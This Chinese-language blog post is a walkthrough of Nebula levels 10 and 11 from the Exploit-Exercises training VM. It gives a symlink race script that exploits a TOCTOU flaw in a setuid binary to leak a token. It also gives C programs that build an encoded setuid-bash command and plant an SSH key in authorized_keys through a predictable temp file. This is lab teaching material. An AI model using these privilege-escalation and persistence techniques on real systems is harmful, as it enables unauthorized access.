---
title: Exploit-exercises_Nebula (Level10~19)
categories: [PWN]
tags: [pwn, exploit-exercises]
---

本文是在解决[Exploit-exerceses](https://exploit-exercises.com)上**Nebula**中题目（Level10~19）时的一些思考与记录。

---

## Level10

题目描述：

> The setuid binary at **/home/flag10/flag10** binary will upload any file given, as long as it meets the requirements of the [access()](http://linux.die.net/man/2/access) system call.

源码：

``` c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

可以看到，整个程序的逻辑是首先利用`access()`函数确定用户是否对文件具有读权限，如果是的话则建立TCP连接、打开读取文件传输。

这其中的trick在于**`access()`函数检查的是进程的`real user`对于一个文件的权限，而`open()`函数操作文件的权限则是取决于`effective use`的权限**。而这两个操作是分开的，所以这就造成了[TOCTOU(time of check to time of use)](https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use)漏洞，这是一个**race condition**类型的漏洞利用。

我们可以创建一个链接文件，使得在`access()`检查的时候它链接到level10用户有读权限的文件，而在open时，使得它链接到token文件。

编写shell脚本（/tmp/flag10.sh）：

``` shell
#!/bin/bash

ln -fs /tmp/flag10.sh /tmp/flag10.ln
/home/flag10/flag10 /tmp/flag10.ln 127.0.0.1 &

for ((i = 0; i < 300; i++)); do
	echo $i > /dev/null
done

ln -fs /home/flag10/token /tmp/flag10.ln
```

其中`&`符合是为了后台运行，就可以非阻塞的执行下一条语句；插入一个for循环是为了延后链接文件的目标文件更改时间，使得它能够在`access()`检查完成后并在`open()`执行前执行（当然这是不确定能100%成功的，可以调节循环次数）。

随后我们可以在另外一个终端里监听18211端口：

	nc -lk 18211

可以收到token文件内容：

	.oO Oo.
	615a2ce1-b2b5-4c76-8eed-8aa5c4015c27

---

## Level11

题目源码：

``` c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv("TEMP");
  pid = getpid();
  
  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
      errx(1, "reading from stdin");
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, "invalid header");
  }

  length = atoi(line + strlen(CL));
  
  if(length < sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, "fread length");
      }
      process(buf, length);
  } else {
      int blue = length;
      int pink;

      fd = getrand(&path);

      while(blue > 0) {
          printf("blue = %d, length = %d, ", blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf("pink = %d\n", pink);

          if(pink <= 0) {
              err(1, "fread fail(blue = %d, length = %d)", blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }    

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, "mmap");
      }
      process(mem, length);
  }

}
```

`process()`函数内前面的异或反向处理非常简单，不再表述。最开始将目光聚焦于下面一段代码：

``` c
if(fread(buf, length, 1, stdin) != length) {
	err(1, "fread length");
}
process(buf, length);
```

但是发现`fread()`的第二、三个参数的值有些别扭，在这种情况下，它的返回值只能是1或0，所以length就只能是1了。所以我们就可以执行一个字母的命令，这可以通过增加`$PATH`变量、然后链接来实现命令执行。但一个问题是只写入一个字母，连字符串结束符`\0`都不能插入，所以只能多次尝试，以期栈上的后一个字节正好是`0x00`。

上面的方法过于麻烦，所以转而看else中的代码，只是要求输入长度大于1024，那么我们就直接在命令后填充无用字节就可以。实现程序：

``` c
//code.c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main() {
	char str[1025] = "cp /tmp/bash /home/flag11/;chmod +s /home/flag11/bash;";
	for (int i = strlen(str); i < 1025; i++) {		
		str[i] = 0x0;
	}
	int length = 1025;
	unsigned int key = length & 0xff;

	char c;
	for (int i = 0; i < length; i++) {
		c = str[i];
		str[i] ^= key;
		key -= c;
	}

	//FILE *f = fopen("/tmp/flag11", "wb");
	fprintf(stdout, "Content-Length: %d\n", length);
	for (int i = 0; i < length; i++) {
		fputc(str[i], stdout);
	}
	//fclose(f);
	return 0;
}
```

仍然打算采用我们之前的获取shell套路，设置好`TEMP`的环境变量之后执行程序：

![](Exploit-exercises-Nebula-remaining/level11_3.png)

结果却发现提示没有权限，百思不得其解。使用IDA逆向`flag11`程序后发现，在执行`system()`函数前先将`effective user id`又设置了回去：

![](Exploit-exercises-Nebula-remaining/level11_1.png)

这与题目中给出的源码并不相同:joy:，本以为已到了绝路。后来通过查找[资料](https://gist.github.com/graugans/88e6f54c862faec8b3d4bf5789ef0dd9)发现，其实题目程序中还有另外可以利用的地方：写文件。在进行写文件的时候，利用的仍然是`effective user id`，可以以flag11的权限来写文件，这也是题目中费尽心机要搞一个随机文件名的目的。

题目源码中生成随机文件名一是体现在`pid`上，但一般来说新建一个进程，它的`pid`是会比上一个进程的`pid`自增1的，所以也是可预测的，即为管道左面的程序`pid+1`；另一个是体现在随机数上，但这里用到的是伪随机，通过`srandom()`设置的种子只要相同，之后产生的随机数序列都是一致的，而这里用到的`time()`函数单位是**秒**，因此也是存在利用的空间的。管道左右两个连续执行的小程序，其`time()`的返回值是大概率相同的。

注意到flag11用户目录下存在`.ssh`文件夹，我们可以在此文件夹下写入我们的公钥到文件`authorized_keys`中，就可以直接ssh登录至flag11账户了。

我们可以编写一程序，创建一个和flag11程序要创建的临时文件同名的文件，将它符号链接到`/home/flag11/.ssh/authorized_keys`，然后输出内容构造为公钥文件内容即可。

代码如下：

``` c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>


int getrand(char **path, int pid, int time)
{
  char *tmp;
  int fd =  0;

  srandom(time);

  tmp = getenv("TEMP");
  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));


  return fd;
}


#define CL "Content-Length: "

int main(int argc, char **argv)
{
  char line[256];
  char buf[2048] = "ssh-rsa your public key here...";

  int pid;
  int fd;
  char *path;

  pid = getpid()+1;
  getrand(&path, pid, time(NULL));
  symlink("/home/flag11/.ssh/authorized_keys",path);

  fprintf(stdout, "%s%d\n%s",CL,sizeof(buf),buf);

}
```

之后即可利用密钥登录ssh：

![Level11](Exploit-exercises-Nebula-remaining/level11_2.png)